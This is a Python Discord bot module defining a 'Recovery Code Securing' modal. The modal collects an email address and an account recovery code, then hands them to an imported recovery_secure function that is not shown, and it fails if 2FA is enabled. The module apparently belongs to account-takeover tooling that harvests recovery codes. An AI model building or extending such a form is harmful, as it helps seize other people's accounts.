from discord import ui
import discord

from securing.recovery_secure import recovery_secure

class recoveryModal(ui.Modal):
    def __init__(self):
        super().__init__(title="Recovery Code Securing")
        self.add_item(ui.InputText(label="Email", placeholder="example@gmail.com", required=True))
        self.add_item(ui.InputText(label="Recovery Code", placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX", required = True))

    async def callback(self, interaction: discord.Interaction):
        email = self.children[0].value
        recovery_code = self.children[1].value
        
        await interaction.response.defer(ephemeral=True)

        account = await recovery_secure(email, "rcvcode", {"recovery_code": recovery_code})

        if account == "invalid":
            await interaction.followup.send(
                embed = discord.Embed(
                    title = "Failed to secure account",
                    description = "Invalid Recovery Code",
                    color = 0x2765F5
                ),
                ephemeral = True
            )
            return
        
        if not account:
            await interaction.followup.send(
                embed = discord.Embed(
                    title = "Failed to secure account",
                    description = "Make sure your recovery code is correct and that 2FA is disabled",
                    color = 0x2765F5
                ),
                ephemeral = True
            )
            return

        return account

    

    